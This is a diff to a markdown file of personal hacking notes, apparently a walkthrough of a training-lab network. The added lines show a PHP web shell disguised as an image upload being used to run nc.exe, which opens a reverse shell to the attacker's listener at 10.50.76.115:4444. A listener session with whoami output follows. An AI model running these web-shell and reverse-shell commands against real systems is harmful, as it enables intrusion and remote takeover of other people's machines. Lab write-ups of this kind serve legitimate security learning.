@@ -349,3 +349,14 @@ http://10.200.96.100/resources/uploads/imag.jpeg.php?command=curl%20http://10.50
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/61aa5658-5fc8-4e8c-a774-9d7440c2182f)
 
+- Now, it's time to get a reverse shell on our machine.
+- By setting up Netcat listener on our machine and using PowerShell command on the website site we got a reverse shell back to our system.
+```powershell
+http://10.200.96.100/resources/uploads/imag.jpeg.php?command=powershell.exe%20c:\\windows\\temp\\nc.exe%2010.50.76.115%204444%20-e%20cmd.exe
+
+
+└─$ rlwrap nc -nvlp 4444
+C:\xampp\htdocs\resources\uploads>whoami
+whoami
+wreath-pc\thomas
+```
